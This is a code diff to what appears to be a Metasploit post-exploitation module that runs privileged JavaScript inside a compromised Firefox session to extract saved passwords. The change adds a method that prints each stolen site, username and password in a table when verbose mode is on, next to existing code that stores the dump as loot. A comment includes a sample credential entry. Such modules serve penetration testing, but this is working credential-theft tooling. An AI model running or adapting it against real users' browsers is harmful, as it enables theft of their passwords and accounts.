@@ -28,6 +28,30 @@ class Metasploit3 < Msf::Post
     ], self.class)
   end
 
+  # Takes the passwords JSON file and prints it nicely
+  # Password entries look like this:
+  # {"password"=>"trustno1", "passwordField"=>"passwd", "username"=>"", "usernameField"=>"email",
+  # "httpRealm"=>"", "formSubmitURL"=>"https://ssl.reddit.com", "hostname"=>"http://www.reddit.com"}
+  def decode_passwords(passwords)
+    tbl = Rex::Ui::Text::Table.new(
+      'Header'  => 'Saved Firefox Passowrds',
+      'Indent'  => 4,
+      'Columns' => [ 'Site','Username', 'Password' ]
+    )
+    passwords_json = passwords.to_json
+
+    passwords.each do |cred|
+      username = cred["username"]
+      password = cred["password"]
+      site     = cred["hostname"]
+      tbl << [site, username, password]
+    end
+
+    tbl.sort_rows(0)
+    print_line tbl.to_s
+  end
+
+
   def run
     print_status "Running the privileged javascript..."
     session.shell_write("[JAVASCRIPT]#{js_payload}[/JAVASCRIPT]")
@@ -41,6 +65,9 @@ class Metasploit3 < Msf::Post
 
         file = store_loot("firefox.passwords.json", "text/json", rhost, passwords.to_json)
         print_good("Saved #{passwords.length} passwords to #{file}")
+        if datastore['VERBOSE']
+          decode_passwords(passwords)
+        end
       rescue JSON::ParserError => e
         print_warning(results)
       end
